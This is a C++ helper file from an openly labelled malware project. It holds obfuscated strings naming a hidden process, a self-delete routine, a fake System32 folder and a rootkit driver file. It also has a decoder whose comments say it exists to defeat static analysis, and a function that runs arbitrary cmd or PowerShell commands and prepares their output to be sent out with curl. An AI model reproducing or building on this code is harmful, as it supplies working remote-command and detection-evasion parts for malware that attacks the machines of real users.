/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "Tools.h"

#include <TlHelp32.h>

Tools::Tools() : HIDE_NAME(this->decode("ecsSowndWiskTatyriu")),
				 SELF_DELETE(this->decode("teledethpa_")),
				 MOCK_FOLDER(this->decode("s owndWi:\\2Cm3teys\\S")), 
				 ROOTKIT_SYS_FILE_NAME(this->decode("ricuSewsdoinrWverikDasyTt"))
{

	this->Computer_Username = this->GetMyName();
}

// Check if Directory is Exists
BOOL Tools::dirExists(const std::string& dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return FALSE;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return TRUE;   // this is a directory!

	return FALSE;    // this is not a directory!
}

// Check if File is Exists
BOOL Tools::FileExists(const std::string& path)
{
	DWORD dwAttribute = GetFileAttributesA(path.c_str());
	if (dwAttribute != INVALID_FILE_ATTRIBUTES && !(dwAttribute & FILE_ATTRIBUTE_DIRECTORY))
		return TRUE;
	return FALSE;
}

// Get Computer Username
std::string Tools::GetMyName()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	GetUserNameA(username, &username_len);
	return username;
}

// Get this program path
std::string Tools::GetThisProgramPath()
{
	char myPath[MAX_PATH];
	GetModuleFileNameA(NULL, myPath, MAX_PATH);
	return std::string(myPath);
}

BOOL Tools::WriteToFile(const std::string& path, const std::string& Text, HANDLE hFile)
{
	if(hFile == NULL)
		hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwBytesToWrite = strlen(Text.c_str()) * sizeof(char);
		DWORD dwBytesWritten = 0;

		if (WriteFile(hFile, Text.c_str(), dwBytesToWrite, &dwBytesWritten, NULL))
		{
			CloseHandle(hFile);
			return TRUE;
		}

		CloseHandle(hFile);
	}

	return FALSE;
}

std::string Tools::ReadFromFile(const std::string& path)
{
	HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		char buffer[256];

		// -1 for null terminator
		DWORD dwBytesToRead = 256 - 1;
		DWORD dwBytesRead = 0;

		if (ReadFile(hFile, buffer, dwBytesToRead, &dwBytesRead, NULL) == TRUE)
		{
			if (dwBytesRead > 0)
			{
				buffer[dwBytesRead] = '\0';
				CloseHandle(hFile);
				return std::string(buffer);
			}
			CloseHandle(hFile);
		}
	}

	return "";
}

BOOL Tools::isSystem32Bit()
{
	BOOL is64 = NULL;
	IsWow64Process(GetCurrentProcess(), &is64);

	if (!is64)
		return TRUE;
		
	return FALSE;
}

// Execute command in the CMD or Powershell and return the result
std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powershell, BOOL changeDirectory, BOOL fileExplorer)
{
	if (powershell)
		command =  "powershell -command \" & " + std::string(command) + "\"";

	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
	if (!pipe)
		throw std::runtime_error("Error!"); // popen() failed.

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
		result += buffer.data();

	// Change Directory option
	if (changeDirectory)
		if (result == "")
			if (SetCurrentDirectoryA(command.c_str()))
				result = "success";

	// Check if the string need to be fix
	
	if (result != "")
	{
		if (!fileExplorer)
		{

			if (result.find('\n') != std::string::npos)
				result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());

			if (result.find('\r') != std::string::npos)
				result.erase(std::remove(result.begin(), result.end(), '\r'), result.end());
		}
		else
		{
			if (result.find('\n') != std::string::npos)
				for (size_t i = 0; i < result.length(); i++)
					if (result[i] == '\n')
						result[i] = '*';
		}


		std::string::size_type pos = result.find("  ");

		while (pos != std::string::npos)
		{
			result.replace(pos, 2, " ");
			pos = result.find("  ", pos);
		}

		if (result.find(' ') != std::string::npos)
		{
			while (result != "" && result[result.size() - 1] == ' ')
				result.erase(result.size() - 1);

			while (result[0] == ' ')
				result.erase(0, 0);
		}

		if (modify_for_curl_send)
		{
			if (result.find(' ') != std::string::npos)
				for (size_t i = 0; i < result.length(); i++)
					if (result[i] == ' ')
						result[i] = '+';
		}
	}
	
	return result;
}

// Custom string decoding - This is using to obfuscate strings from static analysis
std::string Tools::decode(std::string encoded_text)
{
	if (encoded_text.length() >= 4)
	{
		std::string reverse = "";
		std::string div = "";
		std::string order = "";

		// Reorder characters. "badc" will be "abcd" - Switch the current char with the next char
		for (size_t i = 0; i < encoded_text.length(); i += 2)
		{
			if (i != encoded_text.length() - 1)
			{
				order += encoded_text[i + 1];
				order += encoded_text[i];
			}
			else
			{
				order += encoded_text[i];
			}
		}

		// Divide the string by 2 and switch there location - "World Hello" will be "Hello World"
		int s = (encoded_text.length()) / 2;

		for (size_t i = s + 1; i < encoded_text.length(); i++) // Put the second half first in the new string
			div += order[i];

		for (int i = 0; i <= s; i++) // put the first half second in the new string
			div += order[i];

		// Reverse the string - "dcba" will be "abcd"
		for (int i = encoded_text.length() - 1; i >= 0; i--)
			reverse += div[i];

		return reverse;
	}

	return "";
}

BOOL Tools::isProcessRunning(const std::string& process_name)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	std::wstring widestr = std::wstring(process_name.begin(), process_name.end());
	const wchar_t* processName = widestr.c_str();

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
		while (Process32Next(snapshot, &entry) == TRUE)
			if (_wcsicmp(entry.szExeFile, processName) == 0)
				return TRUE;

	CloseHandle(snapshot);
	return FALSE;
}